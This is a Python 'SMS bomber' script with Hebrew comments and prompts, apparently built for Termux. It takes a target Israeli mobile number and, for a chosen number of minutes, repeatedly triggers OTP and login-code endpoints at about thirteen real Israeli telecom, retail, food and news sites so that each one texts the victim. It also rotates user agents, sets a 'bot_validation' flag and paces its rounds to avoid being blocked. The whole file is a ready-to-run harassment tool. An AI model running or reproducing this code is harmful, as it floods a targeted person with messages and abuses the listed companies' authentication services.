import requests
import asyncio
import random
import sys
import time
from datetime import datetime, timedelta

# נסיון לייבא צבעים, אם אין ב-Termux זה פשוט יעבוד בלי
try:
    from colorama import Fore, Style, init
    init()
    RED = Fore.RED
    GREEN = Fore.GREEN
    CYAN = Fore.CYAN
    RESET = Style.RESET_ALL
except ImportError:
    RED = GREEN = CYAN = RESET = ""

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; SM-S901B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36"
]

def api_call(url, data=None, method="POST", is_json=True):
    try:
        headers = {
            "User-Agent": random.choice(USER_AGENTS),
            "Accept": "*/*",
            "Content-Type": "application/json" if is_json else "application/x-www-form-urlencoded"
        }
        if method == "GET":
            r = requests.get(url, headers=headers, timeout=5)
        elif method == "PUT":
            r = requests.put(url, json=data, headers=headers, timeout=5)
        else:
            if is_json:
                r = requests.post(url, json=data, headers=headers, timeout=5)
            else:
                r = requests.post(url, data=data, headers=headers, timeout=5)
        return r.status_code in [200, 201, 204]
    except:
        return False

async def fire_round(phone):
    # רשימת ה-APIs המדויקת שביקשת
    tasks = [
        # סלקום
        asyncio.to_thread(api_call, "https://digital-api.cellcom.co.il/api/otp/LoginStep1", {"Subscriber": phone, "IsExtended": False, "ProcessType": "", "OtpOrigin": "main OTP"}, method="PUT"),
        # MyOfer
        asyncio.to_thread(api_call, "https://server.myofer.co.il/api/sendAuthSms", {"phoneNumber": phone}),
        # אתרי Magento (אופנה)
        asyncio.to_thread(api_call, "https://www.nine-west.co.il/customer/ajax/post/", {"type": "login", "telephone": phone, "bot_validation": 1}, is_json=False),
        asyncio.to_thread(api_call, "https://www.timberland.co.il/customer/ajax/post/", {"type": "login", "telephone": phone, "bot_validation": 1}, is_json=False),
        asyncio.to_thread(api_call, "https://www.fixfixfixfix.co.il/customer/ajax/post/", {"type": "login", "telephone": phone, "bot_validation": 1}, is_json=False),
        asyncio.to_thread(api_call, "https://www.intima-il.co.il/customer/ajax/post/", {"type": "login", "telephone": phone, "bot_validation": 1}, is_json=False),
        asyncio.to_thread(api_call, "https://www.gali.co.il/customer/ajax/post/", {"type": "login", "telephone": phone, "bot_validation": 1}, is_json=False),
        asyncio.to_thread(api_call, "https://www.aldoshoes.co.il/customer/ajax/post/", {"type": "login", "telephone": phone, "bot_validation": 1}, is_json=False),
        # אוכל
        asyncio.to_thread(api_call, "https://app.burgeranch.co.il/_a/aff_otp_auth", {"phone": phone}, is_json=False),
        asyncio.to_thread(api_call, "https://www.papajohns.co.il/_a/aff_otp_auth", {"phone": phone}, is_json=False),
        # Globes (ערך 154)
        asyncio.to_thread(api_call, "https://www.globes.co.il/news/login-2022/ajax_handler.ashx", {"value": phone, "value_type": "154"}, is_json=False),
        # נוספים
        asyncio.to_thread(api_call, "https://users-auth.hamal.co.il/auth/send-auth-code", {"value": phone, "type": "phone", "projectId": "1"}),
        asyncio.to_thread(api_call, f"https://www.ivory.co.il/user/login/sendCodeSms/temp@gmail.com/{phone}", method="GET")
    ]
    
    results = await asyncio.gather(*tasks)
    success = sum(1 for r in results if r is True)
    return success, len(tasks)

async def main():
    print(f"{CYAN}--- CyberIL Spamer v3.0 (Termux Edition) ---{RESET}")
    phone = input(f"{GREEN}📱 מספר יעד: {RESET}")
    if not phone.startswith("05") or len(phone) != 10:
        print(f"{RED}❌ מספר לא תקין!{RESET}")
        return

    try:
        minutes = int(input(f"{GREEN}⏳ זמן פעולה בדקות: {RESET}"))
    except ValueError:
        print(f"{RED}❌ הכנס מספר דקות תקין!{RESET}")
        return

    end_time = datetime.now() + timedelta(minutes=minutes)
    
    print(f"{CYAN}🚀 מתחיל הפצצה על {phone} ל-{minutes} דקות...{RESET}")
    
    while datetime.now() < end_time:
        s, total = await fire_round(phone)
        print(f"[{datetime.now().strftime('%H:%M:%S')}] ✅ הצלחות: {s}/{total}")
        
        if datetime.now() < end_time:
            # ב-Termux עדיף לא להפציץ כל שניה כדי לא להיחסם ע"י ספק האינטרנט
            await asyncio.sleep(45)

    print(f"\n{GREEN}🏁 הפעולה הסתיימה בהצלחה!{RESET}")

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print(f"\n{RED}🛑 הפעולה הופסקה ע'י המשתמש.{RESET}")
